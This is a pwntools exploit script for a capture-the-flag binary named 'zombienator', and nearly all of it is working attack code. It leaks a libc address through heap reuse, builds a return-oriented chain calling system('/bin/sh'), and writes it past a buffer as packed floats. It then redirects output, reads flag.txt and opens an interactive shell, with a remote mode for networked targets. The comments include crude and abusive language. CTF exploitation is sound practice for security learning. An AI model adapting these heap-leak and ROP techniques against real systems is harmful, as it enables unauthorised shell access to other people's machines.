from pwn import *
import sys
import ctypes

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./zombienator"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *main+163
    b *attack+223
'''

def init():
    ## loading custom libc
    env = {"LD_PRELOAD": "./glibc/libc.so.6"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary, env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def chose_menu(choise, meme = False):
    if (meme == False):
        pp.recvuntil(b">> ")
    pp.sendline(str(choise).encode("utf-8"))

    delims = [b"tier: ", b"position: ", b">>", b"attacks: ", b"!"]
    return pp.recvuntil(delims[choise - 1])

def create_zombie(tier, place, zebi=False):
    chose_menu(1,zebi)
    pp.sendline(str(tier).encode())
    pp.recvuntil(b" Back line (5-9): ")
    pp.sendline(str(place).encode())

def delete_zombie(place):
    chose_menu(2)
    pp.sendline(str(place).encode())

def display():
    leakedshit = []
    result = chose_menu(3)
    spl = result.split(b"\n")
    for i in spl:
        if (b": " in i):
            z = i.split(b": ")[1]
            if (b"Empty" not in z and b"ready" not in z):
                z += b"\x00" * (8 - len(z))
                leakedshit.append(unpack(z))
            else :
                # print(z)
                leakedshit.append(0)

    return (leakedshit)


def float_pack(bs):
    pepe = p64(bs)
    return str(struct.unpack("d", pepe)[0]).encode()

def fuck_memo(payload):
    chose_menu(4, True)
    # pp.recvuntil(b"attacks:")
    pp.sendline(str(34 + len(payload)).encode())
    for i in range(0, 33):
        pp.recvuntil(b":")
        pp.sendline(b"0")
    pp.recvuntil(b":")
    pp.sendline(b".")
    for i in payload :
        pp.recvuntil(b":")
        log.info(f"fucking gadget {hex(i)}")
        pp.sendline(float_pack(i))
    # for i in range(0, 1):
    #     pp.recvuntil(b":")
    #     pp.sendline(b"0")


def leak_data():
    for x in range(1, 130):
        log.info(f"sending chunks {x / 130 * 100}")
        for i in range(0,10):
            create_zombie("130", i)
        for i in range(0,10):
            delete_zombie(i)
        leaked_pie = display()
        for i in leaked_pie:
            if ("0x5" not in str(hex(i)) and i != 0):
                return (i)
        create_zombie(x, i,True)
    return (19)

def exploit():
    # log.info("binary loaded")

    leaked_data = leak_data()
    libc.address = leaked_data - 2202848
    system = libc.sym.system
    puts = libc.sym.puts
    binsh = next(libc.search(b"/bin/sh\0"))
    tty = next(libc.search(b"/dev/tty\0"))
    w = next(libc.search(b"w\0"))
    freopen = libc.sym.freopen
    openx = libc.sym.open
    fopen = libc.sym.fopen
    stdout = libc.sym.stdout
    pop_rdi_ret = libc.address + 0x000000000002a3e5
    pop_rsi_ret = libc.address + 0x000000000002be51
    pop_rdx_ret = libc.address + 0x00000000000796a2
    ret = libc.address + 0x00000000000f9e3c
    mov_qrsi_rdx = libc.address + 0x000000000005652a
    zebi  = libc.address + 0x00000000000b108b
    # 0x00000000000b108b: mov qword ptr [rdi], rax; mov rax, r9; ret;

    # chose_menu(5, True)
    
    payload = [
        0,                  # fake rbp
        pop_rdi_ret,        # poping rdi 
        binsh,              # /bin/sh string in libc
        ret,                # returning 
        system              # calling system, it would be fucked because the fucking retard closed std
        # ret
            ]
    fuck_memo(payload)

    pp.sendline(b"exec 1>&0")
    pp.sendline(b"cat flag.txt")
    print(pp.recvuntil(b"}"))
    pp.interactive()

libc = ELF("./glibc/libc.so.6")
elf = context.binary = ELF(binary)
pp = init()
exploit()
